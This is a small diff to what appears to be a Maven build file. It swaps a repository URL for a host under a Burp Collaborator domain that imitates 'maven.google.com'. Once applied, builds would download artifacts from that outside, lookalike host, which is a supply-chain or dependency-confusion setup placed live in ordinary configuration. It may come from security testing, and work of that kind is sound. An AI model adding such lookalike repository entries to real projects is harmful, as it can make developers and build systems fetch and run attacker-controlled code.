@@ -16,7 +16,7 @@
 <repositories>
    <repository>
        <id>org.source.repo</id>
-       <url>http://delta.v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/</url>
+       <url>http://maven.google.com.v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/</url>
    </repository>
 </repositories>
 
